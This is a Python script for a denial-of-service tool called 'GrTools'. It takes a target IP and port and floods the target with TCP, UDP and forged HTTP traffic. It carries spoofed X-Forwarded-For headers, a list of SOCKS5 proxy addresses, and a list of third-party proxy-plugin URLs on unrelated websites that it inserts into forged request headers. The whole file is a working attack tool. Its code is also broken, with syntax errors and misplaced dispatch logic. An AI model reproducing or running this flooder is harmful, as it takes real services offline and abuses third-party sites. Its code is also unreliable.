import requests
import socket
import random
import ctypes
import sys
import datetime
import ssl
import http.client
import threading
import os
import time

useragents = [
     'Mozilla/5.0 (Android; Linux armv7l; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 Fennec/10.0.1', 'Mozilla/5.0 (Android; Linux armv7l; rv:2.0.1) Gecko/20100101 Firefox/4.0.1 Fennec/2.0.1', 'Mozilla/5.0 (WindowsCE 6.0; rv:2.0.1) Gecko/20100101 Firefox/4.0.1',
     'Mozilla/5.0 (Android; Linux armv7l; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 Fennec/10.0.1', 'Mozilla/5.0 (Android; Linux armv7l; rv:2.0.1) Gecko/20100101 Firefox/4.0.1 Fennec/2.0.1', 'Mozilla/5.0 (WindowsCE 6.0; rv:2.0.1) Gecko/20100101 Firefox/4.0.1',
     'Mozilla/5.0 (Windows NT 5.1; rv:5.0) Gecko/20100101 Firefox/5.0',
     'Mozilla/5.0 (Windows NT 5.2; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 SeaMonkey/2.7.1',
     'Mozilla/5.0 (Windows NT 6.0) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/15.0.874.120 Safari/535.2',
     'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/18.6.872.0 Safari/535.2 UNTRUSTED/1.0 3gpp-gba UNTRUSTED/1.0',
     'Mozilla/5.0 (Windows NT 6.1; rv:12.0) Gecko/20120403211507 Firefox/12.0',
     'Mozilla/5.0 (Windows NT 6.1; rv:2.0.1) Gecko/20100101 Firefox/4.0.1',
     'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:2.0.1) Gecko/20100101 Firefox/4.0.1',
     'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/534.27 (KHTML, like Gecko) Chrome/12.0.712.0 Safari/534.27',
     'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.24 Safari/535.1',
     'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.7 (KHTML, like Gecko) Chrome/16.0.912.36 Safari/535.7',
     'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.6 (KHTML, like Gecko) Chrome/20.0.1092.0 Safari/536.6',
     'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:10.0.1) Gecko/20100101 Firefox/10.0.1',
     'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:15.0) Gecko/20120427 Firefox/15.0a1',
     'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:2.0b4pre) Gecko/20100815 Minefield/4.0b4pre',
     'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:6.0a2) Gecko/20110622 Firefox/6.0a2',
     'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:7.0.1) Gecko/20100101 Firefox/7.0.1',
     'Mozilla/5.0 (Windows NT 6.2) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1061.1 Safari/536.3',
     'Mozilla/5.0 (Windows; U; ; en-NZ) AppleWebKit/527  (KHTML, like Gecko, Safari/419.3) Arora/0.8.0',
     'Mozilla/5.0 (Windows; U; Win98; en-US; rv:1.4) Gecko Netscape/7.1 (ax)',
     'Mozilla/5.0 (Windows; U; Windows CE 5.1; rv:1.8.1a3) Gecko/20060610 Minimo/0.016',
	 "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:10.0.1) Gecko/20100101 Firefox/10.0.1",
	 "Mozilla/5.0 (Linux; Android 7.1.1; MI 6 Build/NMF26X; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.132 MQQBrowser/6.2 TBS/043807 Mobile Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/WIFI Language/zh_CN",
	 "Mozilla/5.0 (Linux; Android 7.1.1; OD103 Build/NMF26F; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.49 Mobile MQQBrowser/6.2 TBS/043632 Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/4G Language/zh_CN",
	 "Mozilla/5.0 (Linux; Android 6.0.1; SM919 Build/MXB48T; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.49 Mobile MQQBrowser/6.2 TBS/043632 Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/WIFI Language/zh_CN",
	 "Mozilla/5.0 (Linux; Android 5.1.1; vivo X6S A Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.49 Mobile MQQBrowser/6.2 TBS/043632 Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/WIFI Language/zh_CN",
	 "Mozilla/5.0 (Linux; Android 5.1; HUAWEI TAG-AL00 Build/HUAWEITAG-AL00; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.49 Mobile MQQBrowser/6.2 TBS/043622 Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/4G Language/zh_CN",
     'Mozilla/5.0 (iphone x Build/MXB48T; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.49 Mobile MQQBrowser/6.2 TBS/043632 Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/WIFI Language/zh_CN'
     'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n',
          'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n',
     'Accept-Encoding: gzip, deflate\r\n',
     'Accept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n',
     'Accept: text/html, application/xhtml+xml, application/xml;q=0.9, */*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Charset: iso-8859-1\r\nAccept-Encoding: gzip\r\n',
     'Accept: application/xml,application/xhtml+xml,text/html;q=0.9, text/plain;q=0.8,image/png,*/*;q=0.5\r\nAccept-Charset: iso-8859-1\r\n',
     'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Encoding: br;q=1.0, gzip;q=0.8, *;q=0.1\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\n',
     'Accept: image/jpeg, application/x-ms-application, image/gif, application/xaml+xml, image/pjpeg, application/x-ms-xbap, application/x-shockwave-flash, application/msword, */*\r\nAccept-Language: en-US,en;q=0.5\r\n',
     'Accept: text/html, application/xhtml+xml, image/jxr, */*\r\nAccept-Encoding: gzip\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\n',
     'Accept: text/html, application/xml;q=0.9, application/xhtml+xml, image/png, image/webp, image/jpeg, image/gif, image/x-xbitmap, */*;q=0.1\r\nAccept-Encoding: gzip\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\n,Accept: text/html, application/xhtml+xml, application/xml;q=0.9, */*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\n',
     'Accept-Charset: utf-8, iso-8859-1;q=0.5\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\n',
     'Accept: text/html, application/xhtml+xml',
     'Accept-Language: en-US,en;q=0.5\r\n',
     'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Encoding: br;q=1.0, gzip;q=0.8, *;q=0.1\r\n',
     'Accept: text/plain;q=0.8,image/png,*/*;q=0.5\r\nAccept-Charset: iso-8859-1\r\n',
     'Accept-Encoding: gzip, deflate\r\n',
     'Accept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n',
     'Accept: text/html, application/xhtml+xml, application/xml;q=0.9, */*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Charset: iso-8859-1\r\nAccept-Encoding: gzip\r\n',
     'Accept: application/xml,application/xhtml+xml,text/html;q=0.9, text/plain;q=0.8,image/png,*/*;q=0.5\r\nAccept-Charset: iso-8859-1\r\n',
     'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Encoding: br;q=1.0, gzip;q=0.8, *;q=0.1\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\n',
     'Accept: image/jpeg, application/x-ms-application, image/gif, application/xaml+xml, image/pjpeg, application/x-ms-xbap, application/x-shockwave-flash, application/msword, */*\r\nAccept-Language: en-US,en;q=0.5\r\n',
     'Accept: text/html, application/xhtml+xml, image/jxr, */*\r\nAccept-Encoding: gzip\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\n',
     'Accept: text/html, application/xml;q=0.9, application/xhtml+xml, image/png, image/webp, image/jpeg, image/gif, image/x-xbitmap, */*;q=0.1\r\nAccept-Encoding: gzip\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\n,Accept: text/html, application/xhtml+xml, application/xml;q=0.9, */*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\n',
     'Accept-Charset: utf-8, iso-8859-1;q=0.5\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\n',
     'Accept: text/html, application/xhtml+xml',
     'Accept-Language: en-US,en;q=0.5\r\n',
     'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Encoding: br;q=1.0, gzip;q=0.8, *;q=0.1\r\n',
     'Accept: text/plain;q=0.8,image/png,*/*;q=0.5\r\nAccept-Charset: iso-8859-1\r\n'
    'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n',
    'Accept-Encoding: gzip, deflate\r\n',
    'Accept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n',
    'Accept: text/html, application/xhtml+xml, application/xml;q=0.9, */*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Charset: iso-8859-1\r\nAccept-Encoding: gzip\r\n',
    'Accept: application/xml,application/xhtml+xml,text/html;q=0.9, text/plain;q=0.8,image/png,*/*;q=0.5\r\nAccept-Charset: iso-8859-1\r\n',
    'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Encoding: br;q=1.0, gzip;q=0.8, *;q=0.1\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\n',
    'Accept: image/jpeg, application/x-ms-application, image/gif, application/xaml+xml, image/pjpeg, application/x-ms-xbap, application/x-shockwave-flash, application/msword, */*\r\nAccept-Language: en-US,en;q=0.5\r\n',
    'Accept: text/html, application/xhtml+xml, image/jxr, */*\r\nAccept-Encoding: gzip\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\n',
    'Accept: text/html, application/xml;q=0.9, application/xhtml+xml, image/png, image/webp, image/jpeg, image/gif, image/x-xbitmap, */*;q=0.1\r\nAccept-Encoding: gzip\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\n,Accept: text/html, application/xhtml+xml, application/xml;q=0.9, */*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\n',
    'Accept-Charset: utf-8, iso-8859-1;q=0.5\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\n',
    'Accept: text/html, application/xhtml+xml',
    'Accept-Language: en-US,en;q=0.5\r\n',
    'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Encoding: br;q=1.0, gzip;q=0.8, *;q=0.1\r\n',
    'Accept: text/plain;q=0.8,image/png,*/*;q=0.5\r\nAccept-Charset: iso-8859-1\r\n'
]
socks5 = [
 """221.211.62.6:1111
8.210.48.101:18193
120.79.53.184:1080
120.24.194.11:1080
91.207.238.107:56288
47.242.230.213:12345
188.165.254.122:9420"""
]

https = [
    'http://search.aol.com/aol/search?q=',
    'https://www.om.nl/vaste-onderdelen/zoeken/?zoeken_term=',
    'https://www.facebook.com/l.php?u=https://www.facebook.com/l.php?u=',
    'https://www.facebook.com/sharer/sharer.php?u=https://www.facebook.com/sharer/sharer.php?u=',
    'https://drive.google.com/viewerng/viewer?url=',
    'http://www.google.com/translate?u=',
    'https://developers.google.com/speed/pagespeed/insights/?url=',
    'https://replit.com/', 'https://check-host.net/', 'https://obaspro.my.id/',
    'http://www.oldbrogue.com/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=',
    'http://mentzerrepairs.com/plugins/system/plugin_googlemap2_proxy.php?url=',
    'http://www.tilmouthwell.com/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=',
    'http://www.homevisionsinc.com/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=',
    'http://toddlers.nalanda.edu.in/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=',
    'http://cultura-city.rv.ua/plugins/system/plugin_googlemap3_proxy.php?url=',
    'http://secret.leylines.info/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=',
    'http://bike-electric.co.uk/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=',
    'http://www.centroaquaria.com/plugins/content/plugin_googlemap2_proxy.php?url='
    'http://agenzia-anna.com/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url='
    'http://www.gretnadrug.com/plugins/system/plugin_googlemap2_proxy.php?url=',
    'http://www.crestwoodpediatric.com/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=',
    'http://www.oceans-wien.com/plugins/system/plugin_googlemap2_proxy.php?url=;BYPASS',
    'http://www.mcdp.eu/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=',
    'http://www.dbaa.co.za/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=',
    'http://waggum-bevenrode.sg-bevenrode.com/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url='
    'http://bwsnt1.pdsda.net/plugins/system/plugin_googlemap3_proxy.php?url=',
    'http://www.astecdisseny.com/plugins/content/plugin_googlemap2_proxy.php?url=',
     'http://www.fillmorefairways.com/plugins/content/plugin_googlemap2_proxy.php?url=',
    'http://growtopiagame.com/', 'http://check-host.net/check-http?url=',
    'http://ip2location.com/', 'https://pointblank.com/',
    'https://www.ted.com/search?q=',
    'https://drive.google.com/viewerng/viewer?url=',
    'http://validator.w3.org/feed/check.cgi?url=',
    'http://host-tracker.com/check_page/?furl=',
    'http://www.online-translator.com/url/translation.aspx?direction=er&sourceURL=',
    'https://soda.demo.socrata.com/resource/4tka-6guv.json?$q=',
    'https://play.google.com/store/search?q=',
    'http://jigsaw.w3.org/css-validator/validator?uri=',
    'https://add.my.yahoo.com/rss?url=', 'http://www.google.com/?q=',
    'https://www.cia.gov/index.html', 'https://www.google.ad/search?q=',
    'https://www.google.ae/search?q=', 'https://vk.com/profile.php?redirect=',
    'http://jigsaw.w3.org/css-validator/validator?uri=',
    'https://add.my.yahoo.com/rss?url=',
    'http://www.google.com/?q=',
    'http://www.usatoday.com/search/results?q=',
    'http://engadget.search.aol.com/search?q=',
    'https://www.google.ae/search?q=', 'https://www.google.com.af/search?q=',
    'https://www.google.com.ag/search?q=',
    'https://www.google.com.ai/search?q=', 'https://www.google.al/search?q=',
    'http://www.usatoday.com/search/results?q=',
    'http://engadget.search.aol.com/search?q=',
    'https://steamcommunity.com/market/search?q=',
    'http://filehippo.com/search?q=',
    'http://www.topsiteminecraft.com/site/pinterest.com/search?q=',
    'http://eu.battle.net/wow/en/search?q=',
]
def spoofer():
    addr = [192, 168, 0, 1]
    d = '.'
    addr[0] = str(random.randrange(11, 197))
    addr[1] = str(random.randrange(0, 255))
    addr[2] = str(random.randrange(0, 255))
    addr[3] = str(random.randrange(2, 254))
    assembled = addr[0] + d + addr[1] + d + addr[2] + d + addr[3]
    return assembled

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

ip = input("Server@GrTools~ Enter Target IP: ")
port = int("Server@GrTools~ Input Port: ")
t = int(input("Server@GrTools~ Input Times: ")
th = int(input("Server@GrTools~ Input Thread: ")
print("""
        ┌───────────────────────────────────────────────────────────────────────────────────────┐
        │                                       GrTools Methods                                 │
        │───────────────────────────────────────────────────────────────────────────────────────│
        │  [+] TCP      |  LAYER4  | BASED ON FLOOD ATTACK ON TCP PORT  | INCREASED POWER 1.5X  │
        │  [+] UDP      |  LAYER4  | BASED ON FLOOD ATTACK ON UDP PORT  | NON                   │
        │  [+] CPUKILL  |  LAYER4  | BASED ON CPU   ATTACK ON ALL PORT  | POWER IS DOWN         │
        │  [+] REQ      |  LAYER4  | BASED ON REQUEST SPAM ON TCP PORT  | INCREASED POWER 2X    │
        │  [+] ALL      |  LAYER4  | BASED ON FLOOD ATTACK ON ALL PORT  | NON                   │ 
        │  [+] SUBNET   |  TOOLS   | FINDING A SUB IP                   | API MAYBE LIMIT       │  
        └───────────────────────────────────────────────────────────────────────────────────────┘
        """)

method = input("╔══\n╚══════>Server@GrTools~~ Enter Methods : ")
expiration_date = datetime.datetime.now() + datetime.timedelta(days=7)
def udpby():
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
        s.connect((ip, port))
        udpfloodl = random._urandom(100024)
        while datetime.datetime.now() < expiration_date:
            try:
                s.sendto(udpfloodl, (ip, port))
                for x in range(7500000):
                    s.sendto(udpfloodl, (ip, port))
                print(f"Sending Packet to > ip : {ip} port : {port} | with time => {t} with Method UDP Flood ")
            except socket.error:
                print(f"Error Cant Connecting | ip : {ip} port : {port}")
                s.close()
   

def cpukil():
        s = socket.socket(socket.AF_INET, socket.IPPROTO_ICMP)
        s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
        s.connect((ip, port))
        cpu = os.urandom(10024)
        while datetime.datetime.now() < expiration_date:
            try:
                s.sendto(cpu, (ip, port))
                for x in range(7500000):
                    s.sendto(cpu, (ip, port))
                print(f"Sending Packet to > ip : {ip} port : {port} | with time => {t} with Method {method} ")
            except socket.error:
                print(f"Error Cant Connecting | ip : {ip} port : {port}")
                s.close()
def req():
        get_host = "GET/growtopia/server_data.php HTTP/1.1\r\nHost: " + ip + "\r\n"
        post_host = "POST /Attacked-by-GrTools HTTP/1.1\r\nHost: " + ip + "\r\n"
        get_data = "GET https://check-host.net//1.1\r\nHost: " + ip + "\r\n"
        referer = "Referer: " + random.choice(https) + ip + "\r\n"
        connection = "Connection: Keep-Alive\r\n" + "\r\n"
        content = "Content-Type: application/x-www-form-urlencoded\r\nX-Requested-With: XMLHttpRequest\r\n charset=utf-8\r\n"
        socks = "socks5: " + random.choice(socks5) + "\r\n"
        length = "Content-Length: 0\r\n"
        forward = "X-Forwarded-For: 1\r\n"
        forwards = "Client-IP: " + ip + "\r\n"
        accept = random.choice(useragents) + "\r\n"
        mozila = "User-Agent: " + random.choice(useragents) + "\r\n"
        httpss = "User-Agent: " + random.choice(https) + "\r\n"
        connection += "X-Forwarded-For: " + spoofer() + "\r\n"
        request = get_host + post_host + get_data + httpss + mozila + referer + content + socks + forward + forwards + accept + connection + connection + "\r\n"
        grtools = os.urandom(205018)
        while True:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
                s.connect((ip, port))
                s.send(grtools)
                s.send(grtools)
                s.send(grtools)
                s.sendall(str.encode(request))
                s.sendall(str.encode(request))
                s.sendall(str.encode(request))
                s.sendall(str.encode(request))
                s.sendall(str.encode(request))
                s.sendall(str.encode(request))
                s.sendall(str.encode(request))
                s.sendall(str.encode(request))
                s.sendall(str.encode(request))
                s.sendall(str.encode(request))
                s.sendall(str.encode(request))
                s.sendall(str.encode(request))
                s.sendall(str.encode(request))
                s.sendall(str.encode(request))
                s.sendall(str.encode(request))
                for x in range(7500000):
                    s.send(grtools)
                    s.send(grtools)
                    s.send(grtools)
                    s.sendall(str.encode(request))
                    s.sendall(str.encode(request))
                    s.sendall(str.encode(request))
                    s.sendall(str.encode(request))
                    s.sendall(str.encode(request))
                    s.sendall(str.encode(request))
                    s.sendall(str.encode(request))
                    s.sendall(str.encode(request))
                    s.sendall(str.encode(request))
                    s.sendall(str.encode(request))
                    s.sendall(str.encode(request))
                    s.sendall(str.encode(request))
                    s.sendall(str.encode(request))
                    s.sendall(str.encode(request))
                    s.sendall(str.encode(request))
                print(f"Sending Packet to > ip : \033[32m{ip} \033[37mport : \033[32m{port} | \033[37mwith time => \033[32m{t} \033[37mwith Method {method} ")
            except socket.error:
                print(f"Sending Packet to > ip : \033[32m{ip} \033[37mport : \033[32m{port} | \033[37mwith time => \033[32m{t} \033[37mwith Method {method} ")
                s.close()
        
def all():
        get_host = "GET HTTP/1.1\r\nHost: " + ip + "\r\n"
        post_host = "POST HTTP/1.1\r\nHost: " + ip + "\r\n"
        get_data = "GET https://check-host.net//1.1\r\nHost: " + ip + "\r\n"
        referer = "Referer: " + random.choice(https) + ip + "\r\n"
        connection = "Connection: Keep-Alive\r\n" + "\r\n"
        content = "Content-Type: application/x-www-form-urlencoded\r\nX-Requested-With: XMLHttpRequest\r\n charset=utf-8\r\n"
        socks = "socks5: " + random.choice(socks5) + "\r\n"
        length = "Content-Length: 0\r\n"
        forward = "X-Forwarded-For: 1\r\n"
        forwards = "Client-IP: " + ip + "\r\n"
        accept = random.choice(useragents) + "\r\n"
        mozila = "User-Agent: " + random.choice(useragents) + "\r\n"
        httpss = "User-Agent: " + random.choice(https) + "\r\n"
        connection += "X-Forwarded-For: " + spoofer() + "\r\n"
        request = get_host + post_host + get_data + httpss + referer + content + socks + forward + forwards + accept + connection + "\r\n"
        grtools = os.urandom(155018) + random._urandom(80000)
        while True:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
                sock.connect((ip, port))
                sock.send(grtools)
                for x in range(7500000):
                    s.sendall(str.encode(request))
                    sock.send(grtools)
                print(f"\Sending Packet to > ip : \033[32m{ip} \033[37mport : \033[32m{port} | \033[37mwith time => \033[32m{t} \033[37mwith Method {method} ")
            except socket.error:
                print(f"Sending Packet to > ip : \033[32m{ip} \033[37mport : \033[32m{port} | \033[37mwith time => \033[32m{t} \033[37mwith Method {method} ")
                sock.close()

def tcpfl():
    get_host = "GET HTTP/1.1\r\nHost: " + ip + "\r\n"
    post_host = "POST /Attacked-by-GrTools HTTP/1.1\r\nHost: " + ip + "\r\n"
    get_data = "GET https://check-host.net//1.1\r\nHost: " + ip + "\r\n"
    referer = "Referer: " + random.choice(https) + ip + "\r\n"
    connection = "Connection: Keep-Alive\r\n" + "\r\n"
    content = "Content-Type: application/x-www-form-urlencoded\r\nX-Requested-With: XMLHttpRequest\r\n charset=utf-8\r\n"
    socks = "socks5: " + random.choice(socks5) + "\r\n"
    length = "Content-Length: 0\r\n"
    forward = "X-Forwarded-For: 1\r\n"
    forwards = "Client-IP: " + ip + "\r\n"
    accept = random.choice(useragents) + "\r\n"
    mozila = "User-Agent: " + random.choice(useragents) + "\r\n"
    httpss = "User-Agent: " + random.choice(https) + "\r\n"
    connection += "X-Forwarded-For: " + spoofer() + "\r\n"
    request = get_host + post_host + get_data + httpss + mozila + referer + content + socks + forward + forwards + accept + connection + connection + "\r\n"
    grtools = random._urandom(150404)
    counter = 0
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
        sock.connect((ip, port))
        for x in range(100000):
            sock.send(grtools)
        print('[Broadcast] Successfully Sent')
        print(f'[Broadcast] Target IP {ip}')
        print(f'[Broadcast] Method {method}')
        print(f'[Broadcast] You can use the tools, with start in the beginning again')
        time.sleep(9000)
    except socket.error:
        sock.close()

    # Mengirimkan log ke server
    
    
    if method == "TCP":
        for _ in range(th):
            t = threading.Thread(target=tcpfl)
            t.start()
    elif method == "CPUKILL":
        t = threading.Thread(target=cpukil)
        t.start()
    elif method == "UDP":
        t = threading.Thread(target=udpby)
        t.start()
    elif method == "ALL":
        t = threading.Thread(target=all)
        t.start()
    elif method == "REQ":
        t = threading.Thread(target=req)
        t.start()        


    
